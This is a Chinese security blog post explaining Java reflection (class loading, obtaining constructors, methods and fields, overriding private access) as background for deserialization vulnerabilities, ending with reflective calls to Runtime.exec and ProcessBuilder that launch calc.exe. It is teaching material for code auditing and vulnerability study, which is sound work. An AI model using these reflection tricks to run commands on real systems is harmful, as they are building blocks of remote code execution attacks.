                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java/" itemprop="url" rel="index">
                    <span itemprop="name">java</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在我们了解或者分析JAVA的反序列化漏洞时，一定绕过不过一个知识点，那就是JAVA的反射调用，所以这次我们专门写一篇文章和大家学习和了解一下JAVA的反射调用。</span><br></pre></td></tr></table></figure>

<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><h3 id="为什么要引入反射机制？"><a href="#为什么要引入反射机制？" class="headerlink" title="为什么要引入反射机制？"></a>为什么要引入反射机制？</h3><p>​        我们在编写程序时会有两种情况，第一种是我们明确知道编译时要使用的类和需要调用的方法的具体信息，这种情况下我们可以使用<code>new xxx()</code>来创建对象并使用。第二种是我们在编译的过程种不知道类或者对象的具体情况，只能通过程序运行时通过动态加载来判断。 比如类的名称和需要调用的属性放在配置文件中，这种配置方式降低了耦合性，我们在写JAVA WEB的过程中经常会遇到。</p>
<p>​        对于第二种方式，我们就无法在编译时得知我们要使用的类的类型和调用的方法，所以引入了反射机制。</p>
<h3 id="什么是JAVA的反射机制？"><a href="#什么是JAVA的反射机制？" class="headerlink" title="什么是JAVA的反射机制？"></a>什么是JAVA的反射机制？</h3><p>​        通过JAVA的反射机制，我们可以在<code>运行时</code>动态的获取到需要调用的类的属性和方法，对于任意对象，也能调用其相应的方法和设置相应的属性，这种动态获取信息和调用方法的属性叫做JAVA的反射机制。</p>
<p>​        通过JAVA的反射机制，我们可以做到如下功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在运行时判断任意一个对象所属的类；</span><br><span class="line">在运行时构造任意一个类的对象；</span><br><span class="line">在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</span><br><span class="line">在运行时调用任意一个对象的方法</span><br></pre></td></tr></table></figure>

<h3 id="如何使用JAVA的反射机制？"><a href="#如何使用JAVA的反射机制？" class="headerlink" title="如何使用JAVA的反射机制？"></a>如何使用JAVA的反射机制？</h3><h4 id="JAVA类的加载机制"><a href="#JAVA类的加载机制" class="headerlink" title="JAVA类的加载机制"></a>JAVA类的加载机制</h4><p>​        要理解JAVA的反射机制，我们肯定避不开JAVA类的一个加载机制。</p>
<p>​        我们知道如果我们需要使用JAVA开发的程序，就需要安装JDK，也就是说如果没有JDK，我们使用的WINDOQWS默认是无法运行JAVA生成的CLASS文件的，其中JDK就默认带有JAVA虚拟机（JVM）,这个JVM就是充当我们我们的JAVA程序和WINDOWS操作系统中间的角色，将我们编译的JAVA程序解释给WINDOWS操作系统运行。</p>
<p>​        当我们通过JAVA命令执行某个程序，该命令将会启动一个JVM，这个程序的所有线程、变量都会放在同一个JVM中运行。</p>
<p>​        当我们的程序需要使用某个类时，如果这个类还没有被加载到内存中，JVM虚拟机会将CLASS文件读入到内存，并对数据进行<strong>校验</strong>、<strong>转换解析</strong>和<strong>初始化</strong>，最终形成可被<strong>虚拟机</strong>直接使用的<code>Java</code>类型的过程。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/171ce88f75d21ba3" alt="Java 执行流程"></p>
<p>​    一般类的加载分为3个阶段：加载、连接、初始化。</p>
<h5 id="类的加载器"><a href="#类的加载器" class="headerlink" title="类的加载器"></a>类的加载器</h5><p>​        <strong>类加载器的加载过程</strong></p>
<ul>
<li>通过一个类的全限定名称来获取定义此类的二进制字节流</li>
<li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>
<li>在java堆中生成一个代表这个类的java.lang.Class对象，作为方法区这些数据的访问入口</li>
</ul>
<p>​        <strong>类的加载器的加载方式</strong></p>
<ul>
<li><p>从本地文件系统加载CLASS文件</p>
</li>
<li><p>从JAR包中加载CLASS文件</p>
</li>
<li><p>通过网络加载CLASS文件</p>
</li>
<li><p>通过JAVA源文件动态编译加载执行</p>
<p>JVM自带的类加载器通常分为如下三种：</p>
</li>
</ul>
<p><strong>BootStrap ClassLoader</strong> ：启动类加载器，是顶层加载器。</p>
<p><strong>Extension ClassLoader</strong>：称之为扩展类加载器，负责加载Java的扩展类库，默认加载$JAVA_HOME中jre/lib/*.jar 或 -Djava.ext.dirs指定目录下的jar包。</p>
<p><strong>System ClassLoader</strong>：称之为系统类加载器，负责加载应用程序classpath目录下所有jar和class文件。</p>
<p>​    那么者三种类型的加载器之间的继承关系是怎样的？可以写个代码简单测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ClassLoader loader &#x3D; Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        System.out.println(loader.getParent());</span><br><span class="line">        System.out.println(loader.getParent().getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202163758388.png" alt="image-20201202163758388"></p>
<p>​        通过上面的结果，我们可以看出    APPClassLoader的父类型是ExtClassLoader，但是ExtClassLoader的父类型空，因为BootStrap ClassLoader是用C++写的。</p>
<h5 id="JVM的类加载机制"><a href="#JVM的类加载机制" class="headerlink" title="JVM的类加载机制"></a><strong>JVM的类加载机制</strong></h5><p>​        <strong>全盘负责</strong>，当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显示使用另外一个类加载器来载入</p>
<p>​        <strong>父类委托</strong>，先让父类加载器试图加载该类，只有在父类加载器无法加载该类时才尝试从自己的类路径中加载该类</p>
<p>​        <strong>缓存机制</strong>，缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存区寻找该Class，只有缓存区不存在，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存区。这就是为什么修改了Class后，必须重启JVM，程序的修改才会生效</p>
<h5 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h5><p>​        类的加载方式有三种：</p>
<ul>
<li><p>命令行启动JAVA程序时由JVM加载</p>
</li>
<li><p>通过Class.forName()方法加载</p>
</li>
<li><p>通过ClassLoader.loadClass()方法动态加载</p>
<p>我们可以写个demo测试一下这几种加载方式有何不不同。</p>
<p>首先测试loadClass方式，我们在loadClass处下断点，查看其具体的操作。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest&#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader loader &#x3D; test666.class.getClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        &#x2F;&#x2F;使用ClassLoader.loadClass()来加载类，不会执行初始化块</span><br><span class="line">        loader.loadClass(&quot;test666&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，默认会执行初始化块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，并指定ClassLoader，初始化时不执行静态块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;, false, loader);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在loadClass中，通过调用findLoadedClass来获取Class对象，再将Class对象返回，这个过程中并不会去调用获取到的Class类的static静态代码块的内容，也不会调用其对应的构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202170613299.png" alt="image-20201202170613299"></p>
<p>​        当我们通过获取的Class对象再调用newInstance方法时，则会先调用static静态代码块，再去调用构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171313057.png" alt="image-20201202171313057"></p>
<p>​        newInstance调用时，先调用静态代码块，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171335684.png" alt="image-20201202171335684"></p>
<p>​        再调用构造函数，如下图所示:</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171418171.png" alt="image-20201202171418171"></p>
<p>​        我们再测试一下Class.forName(“test666”)是如何工作的，由于forName内部的实现都是native层的，我这里跟踪不到，就不具体分析了，我们只了解一下它的执行结果。在<strong>调用forName后，会自动调用对应类的静态代码块，但不会执行构造方法。</strong>如果需要调用构造方法，则也需要调用newInstance方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202172214675.png" alt="image-20201202172214675"></p>
<p>​        我们之前的测试中加载的类是由无参数的构造方法的，如果没有无参数的构造方法，那么我们在调用newInstance的过程中，是否会去调用有参的构造方法。<strong>当我将加载类的构造方法的无参构造方法去掉时，调用newInstance将不会执行任何操作。</strong></p>
<p>​        关于类的加载先了解这么多，我们接下来主要了解下当获取到Class对象后如何通过反射调用来获取类的信息。</p>
<h4 id="反射调用获取类的信息"><a href="#反射调用获取类的信息" class="headerlink" title="反射调用获取类的信息"></a>反射调用获取类的信息</h4><p>​        通过之前的学习我们了解了如何获取Class对象，获取了这个对象后我们如何获取类的其他信息？我们接下来将一起学习这部分的内容。</p>
<h5 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h5><p>​        之前我们直接通过获取到的Class调用newInstance方法，只会调用访问权限为Public的无参构造器，如果我们想获取其他构造器该怎么办？JAVA为我们提供了下面几种获取构造器的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;T&gt; getConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的public构造器</span><br><span class="line">Constructor&lt;?&gt;[] getConstructors()  返回这个类的所有public类型的构造器</span><br><span class="line">Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的无视访问权限的构造器</span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructor()  获取Class对象的所有构造器无视访问权限的构造器</span><br></pre></td></tr></table></figure>

<p>​        我这里做了一个测试，我们尝试获取public访问权限的带参构造器,代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        成功访问到对应的带参构造器，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202180512409.png" alt="image-20201202180512409"></p>
<p>​        尝试访问priivate 权限的带参构造器，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getDeclaredConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        经过测试，也仅仅只能getDeclaredConstructor获取private类型的构造器，通过newInstance来调用private的构造方法还是会报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181052265.png" alt="image-20201202181052265"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181100882.png" alt="image-20201202181100882"></p>
<h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p>​        下面我们一起学习一下如何获取对应的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到该类所有的方法无视方法的访问权限</span><br><span class="line">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到指定类的public方法</span><br></pre></td></tr></table></figure>

<p>​        我们做一个测试,查看如何通过getMethod获取对应的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Method methods &#x3D;test666.getMethod(&quot;xxx&quot;,String.class);</span><br><span class="line">System.out.println(methods);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223349526.png" alt="image-20201202223349526"></p>
<p>​        上面是当我们反射调用的test666类存在xxx方法时调用的结果，如果test666类不存在我们要调用的xxx方法，而test666的父类test888存在我们要调用的方法，那么我们通过getMethod是否能获取test888对应的方法呢？</p>
<p>​        答案是<strong>当前通过反射调用getMethod的类如果没有我们想要调用的方法，则会通过反射调用父类对应的方法</strong>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223717517.png" alt="image-20201202223717517"></p>
<p>​    当我们将需要反射调用的方法改为private的访问权限，通过getDeclaredMethod仍然可以找到对应的方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202224039107.png" alt="image-20201202224039107"></p>
<h5 id="获取变量"><a href="#获取变量" class="headerlink" title="获取变量"></a>获取变量</h5><p>​        获取变量的信息可以通过下面的两个方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFiled：访问公有的成员变量</span><br><span class="line">getDeclaredField：所有已声明的成员变量，但不能得到其父类的成员变量</span><br></pre></td></tr></table></figure>

<p>​        为了方便大家理解，我们同样写一个DEMO进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getField(&quot;cmd&quot;);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p>​        在test666这个类中，有一个cmd参数，我们测试能否通过反射调用来获取cmd这个变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203092022639.png" alt="image-20201203092022639"></p>
<p>​        我们打开debug进行调试，可以看到当调用newInstance来创建test666这个类的实例时，会对变量进行初始化。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111226737.png" alt="image-20201203111226737"></p>
<p>​    通过getFiled获取到cmd变量，最后通过filed.get获取实例化对象o对应的变量cmd的内容进行输出。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111441672.png" alt="image-20201203111441672"></p>
<p>​        但是使用getFiled获取不到函数中定义的变量，即使是构造函数中的变量也无法获得，当我们尝试获取非public权限的变量，会获取失败，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112359310.png" alt="image-20201203112359310"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112439206.png" alt="image-20201203112439206"></p>
<p>​        我们将test666这个类中的变量cmd访问权限修改为private，setAccessible修改访问权限后，通过反射调用获取变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113340739.png" alt="image-20201203113340739"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113529161.png" alt="image-20201203113529161"></p>
<h5 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h5><p>​        获取到方法后，我们可以通过invoke来调用方法，并传递参数，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">  Object o&#x3D;test666.newInstance();</span><br><span class="line">  Method method &#x3D; test666.getMethod(&quot;test123&quot;, String.class);</span><br><span class="line">  Object result &#x3D; method.invoke(o,&quot;hello world&quot;);</span><br><span class="line">  System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        在test666类中的test123方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public String test123(String aaa)&#123;</span><br><span class="line">    String x&#x3D;aaa;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过invoke反射调用，执行test123方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203114541607.png" alt="image-20201203114541607"></p>
<p>​        如果是private的方法，我们也可以通过getDeclaredMethod来获取并进行调用，不过在调用之前需要调用setAccessible方法设置属性。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203120405405.png" alt="image-20201203120405405"></p>
<h5 id="修改私有变量"><a href="#修改私有变量" class="headerlink" title="修改私有变量"></a>修改私有变量</h5><p>​        我们之前了解了一些获取变量的方法，那么这些变量我们该如何进行修改呢？下面是我的测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">      Object o&#x3D;test666.newInstance();</span><br><span class="line">      Field privateField &#x3D; test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">      privateField.setAccessible(true);</span><br><span class="line">      privateField.set(o, &quot;hello&quot;);</span><br><span class="line">      System.out.println(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>​        test666类中cmd的值是xxx</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132448457.png" alt="image-20201203132448457"></p>
<p>​        运行程序后，cmd变量的值成功被修改。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132532134.png" alt="image-20201203132532134"></p>
<h4 id="反射调用执行系统命令"><a href="#反射调用执行系统命令" class="headerlink" title="反射调用执行系统命令"></a>反射调用执行系统命令</h4><p>​        我们平时遇到的JAVA命令执行，大多数是通过反射调用Process.builder执行系统命令而很少使用Runtime.exec来执行命令，这是为什么？能否通过Runtime.exec来执行命令呢？</p>
<h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>​        首先测试一下Runtime能否通过反射调用exec方法来进行命令执行，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor con&#x3D;clazz.getDeclaredConstructor();</span><br><span class="line">Object o&#x3D; con.newInstance();</span><br><span class="line">Method methods &#x3D;clazz.getDeclaredMethod(&quot;exec&quot;,String.class);</span><br><span class="line">methods.invoke(o,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>​        我在测试过程中发现，当执行到newInstance会报错</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142145567.png" alt="image-20201203142145567"></p>
<p>​        我们查看runtime的源码，可以看到Runtime只有一个private类型的构造函数，因此直接调用这个构造函数会因为访问权限不足而报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142209061.png" alt="image-20201203142209061"></p>
<p>​        但是结合我们之前讲过的方法，我们可以使用setAccessible来设置访问权限,我尝试修改这个构造方法的访问权限，最终可以通过反射来调用Runtime.exec来执行命令。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142503837.png" alt="image-20201203142503837"></p>
<h5 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h5><p>​        我们再试试通过ProcessBuilder来执行系统命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">Constructor con &#x3D; test666.getConstructor(List.class);</span><br><span class="line">Object o&#x3D;con.newInstance(Arrays.asList(&quot;calc.exe&quot;));</span><br><span class="line">Method method &#x3D; test666.getMethod(&quot;start&quot;);</span><br><span class="line">Object result &#x3D; method.invoke(o);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        这里需要注意，由于ProcessBuilder没有无参构造器，所以在调用构造方法的时候需要传递需要的参数类型，创建实例的时候也需要传入参数，但是调用start方法的时候无需传入参数，由于ProcessBuilder的构造方法是public类型，因此无需设置访问权限。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203144932128.png" alt="image-20201203144932128"></p>
<p>​        当然ProcessBuilder的构造方法不止这一个，还有一个重载的方法</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203145832898.png" alt="image-20201203145832898"></p>
<p>​        下面我们学习一下如何通过反射调用这个方法，这里面使用了的参数是变长参数，对于边长参数，我们也可以当数组来处理，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152347974.png" alt="image-20201203152347974"></p>
<p>​        所以我们获取这个构造方法时可以这样<code>getConstructor(String[].class)</code> </p>
<p>当我们通过<code>newInstance</code>来创建实例时，由于newInstance这个函数也是可变参数，所以可以使用两层数组来引用<code>new String[][]calc.exe</code>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152629453.png" alt="image-20201203152629453"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152723799.png" alt="image-20201203152723799"></p>
<p>​        由于newInstance接收的可变参数是Object类型，因此可以通过<code>(Object)new String[]{&quot;calc.exe&quot;}</code>来创建实例。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203153631825.png" alt="image-20201203153631825"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">shiro rce漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-28 22:07:45" itemprop="dateCreated datePublished" datetime="2020-11-28T22:07:45+08:00">2020-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-02 11:01:38" itemprop="dateModified" datetime="2020-12-02T11:01:38+08:00">2020-12-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java/" itemprop="url" rel="index">
                    <span itemprop="name">java</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
